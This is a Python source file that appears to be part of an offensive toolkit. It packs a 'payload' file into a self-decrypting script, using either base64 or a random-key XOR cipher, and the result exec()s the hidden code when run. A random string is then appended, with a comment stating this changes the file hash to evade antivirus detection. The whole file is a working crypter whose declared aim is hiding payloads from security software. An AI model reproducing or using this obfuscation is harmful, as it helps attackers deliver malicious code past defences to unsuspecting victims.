# Self Decrypting Logic
import os
import random
import string
import sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from terminal_management.tman import clear
from terminal_management import color

def base64_esd(file_path, output_file_destination=None):
    import base64
    with open(file_path, 'rb') as f:
        encode = base64.b64encode(f.read())

    if output_file_destination:
        destination = f'{str(output_file_destination).replace(".py", "")}-base64.py'
    else:
        destination = f'base64_{os.path.basename(file_path)}'
    with open(destination, 'w') as f:
        f.write(f'import base64\nexec(base64.b64decode({encode}))')
    return destination


def symmetric_key(file_path, output_file_destination=None):
    import secrets
    with open(file_path, 'rb') as file:
        data = file.read()

    key = secrets.token_bytes(16)
    iv = secrets.token_bytes(16)
    output = bytearray(iv)

    for i, byte in enumerate(data):
        output.append(byte ^ key[i % len(key)] ^ iv[i % len(iv)])

    key_str = str(list(key))
    output_str = str(list(output))

    if output_file_destination:
        destination = f'{str(output_file_destination).replace(".py", "")}-encrypted.py'
    else:
        destination = f'encrypted_{os.path.basename(file_path)}'
    with open(destination, 'w') as self_decrypting_file:
        decryption_logic = f"""
key = {key_str}
encrypted_data = {output_str}
iv = bytes(encrypted_data[:16])
encrypted_data = bytes(encrypted_data[16:])
output = bytearray()
for i, byte in enumerate(encrypted_data):
    output.append(byte ^ key[i % len(key)] ^ iv[i % len(iv)])
exec(output.decode())
"""
        self_decrypting_file.write(decryption_logic)
        return destination

def encrypt_payload(payload_file_path=None):
    if not payload_file_path:
        while True:
            payload_file_path = input('file address: ').replace('\'', '').replace('[', '').replace(']', '').replace('\"','')
            print(f'{payload_file_path} is the file address? (y/n): ')
            if input().lower() == 'y':
                break
    print(f'{color.white("1. base64")} \n{color.white("2. Symmetric Key")} {color.bright_blue("(recommended)")}')
    while True:
        selection = input(f'{color.bright_black("> ")}')
        if selection == '1':
            encrypted_file_address = base64_esd(file_path=payload_file_path,
                                                            output_file_destination=payload_file_path)
            break
        elif selection == '2':
            encrypted_file_address = symmetric_key(file_path=payload_file_path,
                                                               output_file_destination=payload_file_path)
            break
        else:
            print('Invalid Selection')
    # add random 256 character string to the end of the file to change the hash of the file to avoid detection by antivirus software

    with open(encrypted_file_address, 'r+') as file:
        randomization = ''.join(random.choices(string.ascii_letters + string.digits, k=256))

        file_content = file.read()
        updated_content = f"{file_content}\n\nrandomization = '{randomization}'\n"
        file.seek(0)
        file.write(updated_content)
        file.truncate()

    clear()
    print(f'Encrypted payload created at {color.bright_green(encrypted_file_address)}')
    return encrypted_file_address
